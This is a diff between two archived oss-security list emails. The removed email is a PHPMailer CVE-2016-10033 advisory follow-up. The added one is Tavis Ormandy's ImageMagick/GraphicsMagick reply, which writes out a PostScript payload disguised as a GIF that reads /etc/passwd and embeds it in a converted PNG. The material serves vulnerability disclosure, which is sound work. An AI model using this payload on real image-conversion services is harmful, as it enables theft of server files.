@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3413" "Tuesday" "27" "December" "2016" "13:08:52" "-0200" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzst2mG3vRMWdXnCiHd8GLMB2Ttw-MAua2e26G1CQS5ayPw@mail.gmail.com>" "99" "Re: [oss-security] PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]" nil nil nil "12" "2016122715:08:52" "[oss-security] PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]" (number mark "U       dawid@legalh Dec 27   99/3413  " thread-indent "\"Re: [oss-security] PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]\"\n") "<20161227001009.GS20382@tracyreed.org>" ("<CADSYzsubAm_GzSJ1S3uoskp1JNJe5Jemb0jtt8waA8QMdcbHOw@mail.gmail.com>" "<20161227001009.GS20382@tracyreed.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1506" "Wednesday" "28" "September" "2016" "14:23:56" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkKmrvJ5KrBEWV=2RXA3MF5M-4c4_FvucO7vN_GESANCpg@mail.gmail.com>" "59" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Cc:" nil nil "9" "2016092821:23:56" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 28   59/1506  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "<CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 5299 invoked by uid 550); 27 Dec 2016 15:47:53 -0000
+Received: (qmail 15822 invoked by uid 550); 29 Sep 2016 03:14:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,139 +11,102 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 14335 invoked from network); 27 Dec 2016 15:09:06 -0000
+Received: (qmail 9227 invoked from network); 28 Sep 2016 21:24:29 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
-        bh=YOTEuUovuoCD2j0diWqCnM6oQ5zArXkUVPrGn+xHPF8=;
-        b=TKzMm3HjWJSrj9ERLPaGbn8k2mWUo76IlQGiLPxaPRLtLOyvjmZPbjJMsrOgKtTUnQ
-         CvO+qLn2CCQPlSCNR7ebML7SiuNxm4AOmHhDFuv15aTh7eP0wdX79K+sJR7D3NkGJVWL
-         cMr1DFnnNRFXWO/t3Nf64E2lgWvg05jD4ZvgcXJaW6Zjun3Z36kyMC8wmKZAVRROT8V+
-         b34smyBvL3PatUchs1lAFz47m9H37CRIBNnnt+Ozm5lLPctPdrbEtaDvGGXkVj8tEGpf
-         VpDiXLQ8UAFcajAOoNV3xmyVCdXaAeOyOmOv8SKEmslMYGdDMFFH3ArVPXb4vwjWRG/3
-         tC9g==
+        d=google.com; s=20120113;
+        h=mime-version:in-reply-to:references:from:date:message-id:subject:to
+         :cc;
+        bh=NLNPjRWTvgYaRde4GhKqep9lft7n1fTwE4OhSh7BAsY=;
+        b=PdXODRwpuCfATru2pUl/qbGwE0OuhHWQHzQw62OJVILHqt+auZFP3DtE6n2gI8Zyf0
+         ilzx8NrpWGzp0aht+w6TBn5zMJ6XcajPuejEuB8YI6Dw6vw72Ugl/Bn3djinjypk+kB+
+         3RrN+jwgQOkLZOTTLK0YsrKNqdiT4oS54UpmpPOTgB0+XKP1/ezLJ6GO0tP8E86R/aQt
+         Z9e5j5gcPFan+6orwNRysCPh5ABsheHGTvC3uPaHB06gn6plnHlY6rEf7QvpNuS9YLCH
+         0nH3dehO0gin7180YBJuVf0Axej1DyoDfinF0yjR6l766BYhC9kQVb6zZiuFBazM8sX0
+         tJQA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
+        d=1e100.net; s=20130820;
         h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to;
-        bh=YOTEuUovuoCD2j0diWqCnM6oQ5zArXkUVPrGn+xHPF8=;
-        b=mpSVmx7jJCjz2GsaWUlbI8WnJxmUmhceY9gGbZFmjxXA/HO4s10qTvo7oBaSi6zNJL
-         GyFcyPBd1VusB+RplrqoFZCN1CGQkE5ctOyEnx90JNuyl4iTfdCVT5pg3niyaTNC5wRe
-         si9RuFk5YhM6dK9IYYErnYUmEPn48xLrOEOmQsteCjK7vzP9g0QSL5/20W8tSdmx7x9E
-         19UFqu4Ui1/RthMdnTTZOcgRN/A/adjlskaQUbQqBmw+LQlBNLo6n0gDNgc8bJsCb/ww
-         wPLRYIai1iCaNaTYGcnFY0NOo4nHRd3oSyjAsrcEooJkjabL7zKY0ezeFvcHiZxZs1+/
-         41eg==
-X-Gm-Message-State: AIkVDXIKFaDyrsp+4GVht2RLczUrJoe/pfI/JJWv9Ew9xq4QGgeXp4kh70S8CiOj4WyZmNiMDzgMNo0IxOMVCg==
-X-Received: by 10.176.75.25 with SMTP id h25mr21501226uaf.106.1482851332550;
- Tue, 27 Dec 2016 07:08:52 -0800 (PST)
+         :message-id:subject:to:cc;
+        bh=NLNPjRWTvgYaRde4GhKqep9lft7n1fTwE4OhSh7BAsY=;
+        b=iPA6i5vsPXOlyqvGGY0CPwcIkkNG7ivCKvXTeviQgCpZiNosAw6ojwwnOVBWqhaQlj
+         rg4vKYZiEmOJoUv/D7/pCTKJ6/v1Fug1s1TaQ1ylNwMofnYd0YCgjuutfXLMgVnEuuum
+         UtYqxed3xssu8wXRkddTNZhZ5aTmovo84p7NNHgfZYHbqURKT0d37L259T9mfi4ATjq3
+         7+YN1pukZAZhrWO/5f2ty/stiPIvaRKgLAjtywyqqJ1ZpGgVSL23VILSB4Rpa1Ouxyt7
+         5eSk9WTxte0YMZeJUD7A/QMDK5Mt2EQXjJckRNSZbxkT9hN/GjqJtvTp5sEP1tvMHWxA
+         tueA==
+X-Gm-Message-State: AA6/9RlAWvrmZtdOw+G9tny5r/ebmdKIKmMcc1THRs2IMVIjgrpUWgvbQLmFLJPT8gfQ8K2MZKxtTy4RMaBXmHsJ
+X-Received: by 10.31.135.14 with SMTP id j14mr19011008vkd.94.1475097857305;
+ Wed, 28 Sep 2016 14:24:17 -0700 (PDT)
 MIME-Version: 1.0
-In-Reply-To: <20161227001009.GS20382@tracyreed.org>
-References: <CADSYzsubAm_GzSJ1S3uoskp1JNJe5Jemb0jtt8waA8QMdcbHOw@mail.gmail.com>
- <20161227001009.GS20382@tracyreed.org>
-From: Dawid Golunski <dawid@legalhackers.com>
-Date: Tue, 27 Dec 2016 13:08:52 -0200
-Message-ID: <CADSYzst2mG3vRMWdXnCiHd8GLMB2Ttw-MAua2e26G1CQS5ayPw@mail.gmail.com>
-To: oss-security@lists.openwall.com
+In-Reply-To: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
+References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
+ <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
+ <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com> <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
+Message-ID: <CAJ_zFkKmrvJ5KrBEWV=2RXA3MF5M-4c4_FvucO7vN_GESANCpg@mail.gmail.com>
 Content-Type: text/plain; charset=UTF-8
-Subject: Re: [oss-security] PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]
+Cc: bfriesen@graphicsmagick.org
+Date: Wed, 28 Sep 2016 14:23:56 -0700
+From: Tavis Ormandy <taviso@google.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] ImageMagick identify "d:" hangs
+To: oss-security@lists.openwall.com
 
-I attached an updated advisory in a new thread.
-
-For anyone looking for it on this thread, the latest version is at:
-
-http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
-
-On Mon, Dec 26, 2016 at 10:10 PM, Tracy Reed <treed@ultraviolet.org> wrote:
-> Note that confining the http process using SELinux or similar MAC system
-> can go a long way to constraining and limiting the damage of inevitable
-> vulnerabilities such as this. Particularly since this is command
-> injection which is precisely what SELinux is good at limiting (as
-> opposed to SQL injection).
+On Wed, Sep 28, 2016 at 1:52 PM, Tavis Ormandy <taviso@google.com> wrote:
 >
-> My shop has a policy that SELinux will be enabled on all web
-> applications and it has already saved us a few times despite being very
-> good at getting things patched up promptly.
+> It seems obvious you can manipulate the output based on this. I'd be
+> interested to hear why I'm wrong about this.
 >
-> On Sun, Dec 25, 2016 at 06:21:07PM PST, Dawid Golunski spake thusly:
->> PHPMailer < 5.2.18 Remote Code Execution [CVE-2016-10033]
->>
->> Severity: CRITICAL
->>
->> Discovered by:
->> Dawid Golunski (@dawid_golunski)
->> https://legalhackers.com
->>
->>
->> PHPMailer
->> "Probably the world's most popular code for sending email from PHP!
->> Used by many open-source projects: WordPress, Drupal, 1CRM, SugarCRM, Yii,
->> Joomla! and many more"
->>
->> Desc:
->> An independent research uncovered a critical vulnerability in PHPMailer that
->> could potentially be used by (unauthenticated) remote attackers to achieve
->> remote arbitrary code execution in the context of the web server user and
->> remotely compromise the target web application.
->> To exploit the vulnerability an attacker could target common website
->> components such as contact/feedback forms, registration forms, password
->> email resets and others that send out emails with the help of a vulnerable
->> version of the PHPMailer class.
->>
->>
->> Patching:
->> Responsibly disclosed to PHPMailer team.
->> They've released a critical security release.
->> If you are using an affected release update to the 5.2.18 security
->> release as advised at:
->> https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md
->>
->> Notes:
->> I know this is a bad timing and a short notice (for everyone probably ;)
->> I've spent most of my Christmas break working on this issue with
->> affected vendors.
->> This has been quite a rush as one of the vendors leaked excessive
->> information on this vulnerability at one point which could aid
->> potential attackers.
->>
->> I've released a limited advisory at the link below:
->>
->> https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
->>
->> This is to give people a chance to immediately patch or at least be
->> aware of the issue before we get closer to a working day/end of
->> holiday for affected users to act on this issue.
->>
->> I'm planning to release the full advisory and a PoC exploit shortly so
->> that everyone is on the same page.
->>
->> Upcoming video PoC:
->>
->> https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html
->>
->>
->> For updates follow:
->>
->> https://twitter.com/dawid_golunski
->>
->> I'll also send another email to the list once it is published.
->>
->> For now,
->> Patch it now before someone else patches it for you (through a reverse shell ;)
->>
->> --
->> Regards,
->> Dawid Golunski
->> https://legalhackers.com
->> t: @dawid_golunski
->
-> --
-> Tracy Reed
 
+Oh, you can just do this:
 
+$ cat test.gif
+%!PS
+/Font /Helvetica-Bold findfont def
+/FontSize 12 def
+Font FontSize scalefont setfont
 
--- 
-Regards,
-Dawid Golunski
-https://legalhackers.com
-t: @dawid_golunski
+/dumpname {
+    dup             % copy filename
+    dup             % copy filename
+    print           % print filename
+    (\n) print      % print newlinea
+    status          % stat filename
+    {
+        (stat succeeded\n) print
+        ( ctime:) print
+        64 string cvs print
+        ( atime:) print
+        64 string cvs print
+        ( size:) print
+        64 string cvs print
+        ( blocks:) print
+        64 string cvs print
+        (\n) print
+        (\n) print
+    }{
+        (unable to stat\n\n) print
+    } ifelse
+    .libfile        % open as library
+    {
+        (.libfile returned file\n\n) print
+        64 string readstring
+        pop         % discard result (should proably test)
+        dup         % copy read string
+        print       % write to stdout
+        % write to output
+        newpath 0 0 moveto show showpage
+        (\n) print
+    }{
+        (.libfile returned string\n) print
+        print
+        (\n) print
+    } ifelse
+} def
+
+(/etc/passwd) /dumpname load 256 string filenameforall
+$ convert test.gif png:test.png
+<creates a file called test.png containing first line of /etc/passwd>
+
+Also seems to work with gm convert.
+
+Tavis.
